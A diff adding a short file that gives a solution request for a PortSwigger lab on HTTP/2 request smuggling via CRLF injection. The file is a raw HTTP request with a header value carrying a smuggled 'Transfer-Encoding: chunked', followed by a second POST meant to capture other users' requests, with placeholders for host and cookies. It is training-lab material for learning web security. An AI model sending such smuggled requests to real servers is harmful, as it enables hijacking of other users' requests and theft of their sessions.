@@ -1,0 +1,23 @@
+The HTTP request at the end of the file is meant to solve the following lab:
+https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-smuggling-via-crlf-injection
+
+NOTE: This request won't work unless the carriage return and newline characters are added via the request header interface.
+
+---START---
+POST / HTTP/1.1
+Host: [SUB_DOMAIN].web-security-academy.net
+Cookie: session=[SESSION_COOKIE]; _lab_analytics=[LAB_ANALYTICS_COOKIE]
+Content-Type: application/x-www-form-urlencoded
+X-Fake: helloTransfer-Encoding: chunked
+
+0
+
+
+POST / HTTP/1.1
+Host: [SUB_DOMAIN].web-security-academy.net
+Cookie: session=[SESSION_COOKIE]; _lab_analytics=[LAB_ANALYTICS_COOKIE]
+Content-Length: 900
+
+search=
+
+---END---
